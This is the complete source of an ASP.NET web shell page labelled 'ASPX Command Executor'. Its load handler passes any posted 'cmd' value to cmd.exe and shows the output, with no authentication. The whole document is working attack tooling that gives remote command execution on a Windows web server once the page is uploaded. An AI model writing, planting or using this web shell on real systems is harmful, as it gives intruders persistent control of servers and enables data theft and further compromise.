<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(Request.Form["cmd"]))
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + Request.Form["cmd"];
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();

            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();

            lblOutput.Text = "<pre>" + Server.HtmlEncode(output + error) + "</pre>";
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>ASPX Shell</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
        input { background: #222; color: #0f0; border: 1px solid #444; width: 80%; padding: 5px; }
        button { background: #444; color: #fff; border: none; padding: 5px 15px; cursor: pointer; }
        .res { margin-top: 20px; border-top: 1px solid #333; }
    </style>
</head>
<body>
    <h3>ASPX Command Executor</h3>
    <form id="form1" runat="server">
        <input type="text" name="cmd" placeholder="Enter command (e.g. whoami, dir, ipconfig)" autofocus />
        <button type="submit">Run</button>
    </form>
    <div class="res">
        <asp:Literal ID="lblOutput" runat="server" />
    </div>
</body>
</html>